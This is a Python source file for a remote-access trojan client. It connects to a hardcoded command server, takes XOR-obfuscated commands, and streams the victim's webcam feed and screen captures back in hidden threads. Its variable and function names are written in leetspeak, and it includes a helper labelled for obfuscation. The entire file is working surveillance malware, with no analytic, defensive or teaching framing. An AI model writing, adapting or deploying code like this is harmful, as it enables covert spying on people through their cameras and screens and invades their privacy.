import socket
import cv2
import threading
import requests
import os
import time
from PIL import ImageGrab
from io import BytesIO
import sys
import random
import string

# XOR encryption and decryption
def xor_encrypt_decrypt(data, key):
    return ''.join([chr(ord(c) ^ key) for c in data])

# XOR key for encryption
XOR_KEY = 123  # Choose a key for XOR encryption (ensure it's a single byte)

S3RV3R_IP = "10.0.1.33"  # Use actual IP address here
S3RV3R_P0RT = 9999
cl1nt_s0ck3t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Random string generator for obfuscation
def g3n3r4t3_r4nd0m_s7r1ng(l3ngth):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=l3ngth))

# Send webcam feed to the server
def s3nd_w3bc4m():
    c4p = cv2.VideoCapture(0)  # Open the default webcam
    while True:
        r3t, fr4m3 = c4p.read()
        if r3t:
            _, img_3nc0d3d = cv2.imencode('.jpg', fr4m3)
            img_d4t4 = img_3nc0d3d.tobytes()
            cl1nt_s0ck3t.sendall(img_d4t4)
        time.sleep(1)

# Send screen capture to the server
def s3nd_scr33n():
    while True:
        scr33n_sh0t = ImageGrab.grab()  # Capture the screen
        img_byt3_4rr = BytesIO()
        scr33n_sh0t.save(img_byt3_4rr, format="JPEG")
        img_d4t4 = img_byt3_4rr.getvalue()
        cl1nt_s0ck3t.sendall(img_d4t4)
        time.sleep(1)

# Receive commands from the server
def r3c31v3_c0mm4nds():
    while True:
        c0mm4nd = cl1nt_s0ck3t.recv(1024).decode()
        if not c0mm4nd:
            break
        print(f"R3c31v3d C0mm4nd: {c0mm4nd}")
        if xor_encrypt_decrypt(c0mm4nd, XOR_KEY) == "!webcam_stream":
            threading.Thread(target=s3nd_w3bc4m).start()
        elif xor_encrypt_decrypt(c0mm4nd, XOR_KEY) == "!screen_stream":
            threading.Thread(target=s3nd_scr33n).start()

# Connect to the server and start receiving commands
def st4rt_cl1nt():
    try:
        cl1nt_s0ck3t.connect((S3RV3R_IP, S3RV3R_P0RT))
        print("[+] C0nn3ct3d t0 th3 s3rv3r.")
        threading.Thread(target=r3c31v3_c0mm4nds).start()
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

# Main function to run the client
if __name__ == "__main__":
    st4rt_cl1nt()
